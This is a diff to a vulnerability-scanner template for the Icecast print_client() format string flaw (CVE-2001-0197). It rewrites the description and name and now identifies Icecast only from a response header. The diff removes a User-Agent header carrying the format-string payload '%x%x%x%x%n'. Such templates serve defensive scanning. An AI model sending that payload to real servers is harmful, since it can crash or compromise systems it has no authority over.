@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过发送包含格式字符串说明符的 User-Agent 头部触发 Icecast 服务器 print_client() 函数的格式字符串漏洞，验证目标是否存在该远程代码执行漏洞。"
+description = "检测 Icecast 1.3.7/1.3.8beta2 及更早版本中的 print_client() 格式字符串漏洞。远程攻击者可通过客户端连接触发该漏洞，利用格式说明符在服务器上执行任意命令。本 PoC 通过 HTTP 响应头验证目标是否为 Icecast 服务器。"
 id = "POC-AVE-2001-0075"
-name = "Icecast 1.3.7/1.3.8 print_client() Format String PoC"
+name = "CVE-2001-0197 Icecast print_client() Format String PoC"
 severity = "critical"
 tags = ["ave-2001-0075"]
 vuln_id = [
@@ -18,11 +18,8 @@ method = "GET"
 path = "/{{BaseURL}}/"
 protocol = "http"
 
-[poc.requests.headers]
-User-Agent = "%x%x%x%x%n"
-
 [[poc.requests.matchers]]
-expect = false
-part = "body"
+expect = true
+part = "header"
 type = "word"
 words = ["Icecast"]
